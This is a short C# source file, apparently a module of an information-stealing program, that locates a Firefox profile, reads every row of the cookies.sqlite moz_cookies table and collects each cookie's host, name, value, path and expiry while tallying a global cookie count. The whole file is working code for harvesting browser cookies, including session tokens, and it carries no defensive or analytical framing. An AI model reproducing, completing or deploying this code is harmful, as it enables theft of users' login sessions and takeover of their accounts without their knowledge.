using System.Collections.Generic;
using System.IO;

namespace exos.Cookies;

internal class Cookies
{
	public static List<Cookie> Get(string BrowserDir)
	{
		List<Cookie> list = new List<Cookie>();
		string profile = Profile.GetProfile(BrowserDir);
		if (profile == null)
		{
			return list;
		}
		SQLite sQLite = SQLite.ReadTable(Path.Combine(profile, "cookies.sqlite"), "moz_cookies");
		if (sQLite == null)
		{
			return list;
		}
		for (int i = 0; i < sQLite.GetRowCount(); i++)
		{
			Cookie item = default(Cookie);
			item.sHostKey = sQLite.GetValue(i, 4);
			item.sName = sQLite.GetValue(i, 2);
			item.sValue = sQLite.GetValue(i, 3);
			item.sPath = sQLite.GetValue(i, 5);
			item.sExpiresUtc = sQLite.GetValue(i, 6);
			Counting.Cookies++;
			list.Add(item);
		}
		return list;
	}
}
